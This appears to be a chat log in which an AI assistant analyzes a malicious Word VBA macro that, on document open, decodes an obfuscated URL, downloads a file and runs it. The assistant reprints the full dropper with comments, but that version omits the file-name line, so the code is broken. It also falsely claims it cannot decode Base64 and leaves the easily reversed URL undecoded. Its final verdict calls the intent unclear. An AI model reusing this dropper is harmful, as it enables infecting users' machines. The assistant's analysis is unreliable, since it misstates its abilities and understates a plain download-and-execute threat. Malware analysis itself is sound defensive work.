Role: assistant
Content: This VBA code segment appears to be a macro stored in a Word document.

The code starts by declaring two variables, http_obj and stream_obj, which will be used to make HTTP requests and handle the response data.

The Document_Open() subroutine is the entry point of the macro and is triggered when the Word document is opened.

Inside the subroutine, the code creates an instance of the Microsoft.XMLHTTP object and the ADODB.Stream object. It then assigns a URL to the URL variable by calling the WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg function with a specific string as an argument.

The FileName variable is assigned the value of the user's environment variable concatenated with a specific string.

The code then opens an HTTP GET request to the URL, sends the request, and retrieves the response body.

The stream_obj is configured to write the response body to a file specified by the FileName variable.

Finally, the code uses the CreateObject("WScript.Shell").Run method to execute the file.

The WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg function is a custom function that takes a string as input and performs some character manipulation on it. It subtracts a constant value (42) from the ASCII value of each character in the string and returns the modified string.

Overall, this code segment appears to be downloading a file from a specific URL and saving it to the user's computer, then executing the downloaded file using the Windows Script Host. The purpose and functionality of the downloaded file are not clear from this code segment alone.

Role: assistant
Content: The analysis from OleTools VBA_Parser.AnalyzeMacro identifies several suspicious or potentially malicious actions in the VBA code:

1. AutoExec/Document_Open: This subroutine runs when the Word or Publisher document is opened. It can be used to automatically execute code upon opening the document.

2. Environ: The Environ function is used to read system environment variables. This can be potentially used to gather sensitive information about the user's system.

3. Open: The Open method is used in conjunction with the ADODB.Stream object. It may open a file, which can be used to read or write data to/from the file system.

4. write: The write method is used with the ADODB.Stream object. It may write data to a file, potentially allowing for the creation or modification of files on the system.

5. ADODB.Stream: The ADODB.Stream object is used to handle data streams, including reading from or writing to files. It can be used to create or modify text files.

6. savetofile: The savetofile method is used with the ADODB.Stream object. It may create a text file and save the data stream to the file.

7. Shell/WScript.Shell/Run/CreateObject: These methods and objects are used to run executable files or system commands. This can be potentially used to execute malicious code or perform unauthorized actions on the system.

8. Microsoft.XMLHTTP: The Microsoft.XMLHTTP object is used to make HTTP requests. It can be used to download files from the internet, which may include malicious content.

9. Chr: The Chr function is used to obfuscate specific strings in the code. This can be used to hide sensitive information or make the code more difficult to analyze.

Overall, the analysis suggests that the VBA code contains several suspicious or potentially malicious actions, including reading system environment variables, opening and writing to files, running executable files or system commands, and downloading files from the internet. These actions should be carefully reviewed and analyzed for potential security risks.

Role: user
Content: If the analysis of the VBA from OleTools disovered Base64 encoded strings, please decode them and provide the decoded code.

Role: assistant
Content: I apologize, but as a text-based AI model, I am unable to directly execute or decode Base64 encoded strings. However, I can provide you with the steps to decode Base64 strings using VBA code.

To decode Base64 encoded strings in VBA, you can use the `Base64Decode` function from the `MSXML2.DOMDocument` object. Here's an example of how you can use it:

```vba
Public Function Base64Decode(ByVal base64String As String) As String
    Dim domDoc As Object
    Set domDoc = CreateObject("MSXML2.DOMDocument")

    Dim elemNode As Object
    Set elemNode = domDoc.createElement("tmp")

    elemNode.DataType = "bin.base64"
    elemNode.Text = base64String

    Base64Decode = StrConv(elemNode.nodeTypedValue, vbUnicode)

    Set elemNode = Nothing
    Set domDoc = Nothing
End Function
```

You can then call this function with the Base64 encoded string as an argument to decode it. For example:

```vba
Dim encodedString As String
encodedString = "SGVsbG8gd29ybGQh"

Dim decodedString As String
decodedString = Base64Decode(encodedString)

MsgBox decodedString
```

Please note that you will need to replace `"SGVsbG8gd29ybGQh"` with the actual Base64 encoded string you want to decode.

By using this function, you can decode any Base64 encoded strings found in the VBA code and analyze the decoded content.

Role: assistant
Content: Certainly! Here's the VBA code with added comments and formatted for better readability:

```vba
' Declare variables
Dim http_obj
Dim stream_obj

' Subroutine that runs when the Word or Publisher document is opened
Public Sub Document_Open()
    ' Create objects for making HTTP requests and handling response data
    Set http_obj = CreateObject("Microsoft.XMLHTTP")
    Set stream_obj = CreateObject("ADODB.Stream")

    ' URL to download the file from (encoded string)
    URL = WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg("’žžšdYY�–ŸŒ�‹ŽŽ£X�™—Y•��žY�¡“�X�¢�")

    ' Open an HTTP GET request to the URL
    http_obj.Open "GET", URL, False

    ' Send the HTTP request
    http_obj.send

    ' Configure the stream object to write the response body
    stream_obj.Type = 1
    stream_obj.Open
    stream_obj.write http_obj.responseBody

    ' Save the response body to the specified file
    stream_obj.savetofile FileName, 2

    ' Run the downloaded file using the Windows Script Host
    CreateObject("WScript.Shell").Run FileName
End Sub

' Function to obfuscate/encode a string
Public Function WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg(strInput As String) As String
    Dim n As Integer, i As Integer
    n = 42

    ' Loop through each character in the input string
    For i = 1 To Len(strInput)
        ' Subtract the constant value (42) from the ASCII value of each character
        Mid(strInput, i, 1) = Chr(Asc(Mid(strInput, i, 1)) - n)
    Next i

    ' Return the modified string
    WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg = strInput
End Function
```

Role: user
Content: What is your final analaysis of this code?

Role: assistant
Content: Based on the analysis of the VBA code, here is the final analysis:

The VBA code appears to be a macro stored in a Word document. It contains a subroutine named `Document_Open` that runs when the document is opened. The code performs the following actions:

1. Creates objects for making HTTP requests (`http_obj`) and handling response data (`stream_obj`).
2. Retrieves a URL from an encoded string using a custom obfuscation function (`WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg`).
3. Retrieves a file name from an encoded string using the `Environ` function and concatenation.
4. Opens an HTTP GET request to the specified URL and sends the request.
5. Configures the `stream_obj` to write the response body.
6. Saves the response body to the specified file using the `savetofile` method.
7. Executes the downloaded file using the Windows Script Host (`CreateObject("WScript.Shell").Run`).

The code also includes a custom function (`WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg`) that obfuscates/encodes a string by subtracting a constant value (42) from the ASCII value of each character.

The analysis from OleTools identified several suspicious or potentially malicious actions, including reading system environment variables, opening and writing to files, running executable files or system commands, and downloading files from the internet. These actions should be carefully reviewed and analyzed for potential security risks.

It's important to note that without further context or information about the purpose and origin of this code, it is difficult to determine its intent or whether it is malicious. It is recommended to exercise caution and thoroughly analyze the code, including the downloaded file, to ensure its safety and compliance with security best practices.
